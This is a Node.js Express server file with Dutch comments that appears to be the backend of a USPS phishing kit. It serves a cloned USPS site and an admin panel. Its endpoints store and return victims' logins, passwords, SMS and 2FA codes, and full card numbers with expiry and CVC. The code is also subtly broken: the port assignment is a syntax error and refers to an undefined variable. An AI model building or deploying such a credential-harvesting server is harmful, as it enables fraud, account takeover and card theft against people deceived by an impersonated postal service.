// server.js

const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || ;

// Directories
const dataDir = path.join(__dirname, 'data');
const uspsDir = path.join(__dirname, 'www.usps.com');
const adminPanelDir = path.join(__dirname, 'admin_panel');

// Middleware
app.use(express.json());

// Zorg dat de 'data' map bestaat
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir);
}

// Statische bestanden
app.use('/admin_panel', express.static(adminPanelDir)); // Admin panel bestanden
app.use(express.static(uspsDir)); // USPS website bestanden als root (belangrijk: NA admin_panel)

// API Endpoints
app.post('/api/submitTwoFA', (req, res) => {
  try {
    fs.writeFileSync(
      path.join(dataDir, '2fa.json'),
      JSON.stringify(req.body, null, 2)
    );
    res.json({ message: '2FA opgeslagen' });
  } catch (err) {
    console.error('❌ Fout bij opslaan 2FA:', err);
    res.status(500).json({ message: 'Opslaan mislukt' });
  }
});

app.get('/api/getTwoFA', (req, res) => {
  try {
    const raw = fs.readFileSync(path.join(dataDir, '2fa.json'), 'utf-8');
    const parsed = raw.trim() ? JSON.parse(raw) : {};
    res.json(parsed);
  } catch (err) {
    res.status(404).json({ message: 'Nog geen keuze gemaakt' });
  }
});

app.post('/api/submitLogin', (req, res) => {
  const filePath = path.join(dataDir, 'logins.json');
  let existing = [];

  try {
    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf-8');
      existing = content.trim() ? JSON.parse(content) : [];
    }

    const loginData = {
      type: req.body.type,
      email: req.body.email,
      phoneNumber: req.body.phoneNumber,
      password: req.body.password,
      smsCode: req.body.smsCode || '',
      twoFACode: req.body.twoFACode || '',
      twoFAchoice: req.body.twoFAchoice || '',
      timestamp: req.body.timestamp,
      sessionId: req.body.sessionId || '' // ✅ Session ID opslaan
    };

    existing.push(loginData);

    fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));
    res.json({ message: 'Login info opgeslagen' });
  } catch (err) {
    console.error('❌ Fout bij opslaan login:', err);
    res.status(500).json({ message: 'Opslaan mislukt' });
  }
});

app.get('/api/getLogins', (req, res) => {
  const filePath = path.join(dataDir, 'logins.json');

  try {
    if (!fs.existsSync(filePath)) return res.json([]);

    const raw = fs.readFileSync(filePath, 'utf-8');
    const logins = raw.trim() ? JSON.parse(raw) : [];
    res.json(logins);
  } catch (err) {
    console.error('❌ Fout bij ophalen logins:', err);
    res.status(500).json({ message: 'Kon logins niet ophalen' });
  }
});

app.get('/api/getPaymentInfo', (req, res) => {
  const filePath = path.join(dataDir, 'payment.json');

  try {
    if (!fs.existsSync(filePath)) return res.json([]);

    const raw = fs.readFileSync(filePath, 'utf-8');
    const payments = raw.trim() ? JSON.parse(raw) : [];
    res.json(payments);
  } catch (err) {
    console.error('❌ Fout bij ophalen betalingen:', err);
    res.status(500).json({ message: 'Kon betalingsdata niet ophalen' });
  }
});

// === Nieuw toegevoegd: API om betalingsgegevens op te slaan ===
app.post('/api/submitPayment', (req, res) => {
  const filePath = path.join(dataDir, 'payment.json');
  let existing = [];

  try {
    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf-8');
      existing = content.trim() ? JSON.parse(content) : [];
    }

    const paymentData = {
      cardholderName: req.body.cardholderName,
      cardNumber: req.body.cardNumber,
      expiryDate: req.body.expiryDate,
      cvc: req.body.cvc,
      timestamp: Date.now(),
      sessionId: req.body.sessionId || '' // ✅ Session ID ook opslaan bij betalingen
    };

    existing.push(paymentData);

    fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));
    res.json({ message: 'Payment opgeslagen' });
  } catch (err) {
    console.error('❌ Fout bij opslaan payment:', err);
    res.status(500).json({ message: 'Opslaan mislukt' });
  }
});
// === einde nieuwe API ===

app.post('/api/clearAll', (req, res) => {
  const files = ['logins.json', '2fa.json', 'payment.json'];

  try {
    files.forEach(file => {
      const filePath = path.join(dataDir, file);
      if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    });
    res.json({ message: 'Alle gegevens gewist' });
  } catch (err) {
    console.error('❌ Fout bij wissen van data:', err);
    res.status(500).json({ message: 'Wissen mislukt' });
  }
});

// Specifieke routes
app.get('/admin_panel', (req, res) => {
  res.sendFile(path.join(adminPanelDir, 'index.html'));
});

// Fallback voor root (gewoon www.usps.com/index.html openen)
app.get('/', (req, res) => {
  res.sendFile(path.join(uspsDir, 'index.html'));
});

// Server starten
app.listen(PORT, () => {
  console.log(`✅ Server gestart op http://localhost:${PORT}`);
});
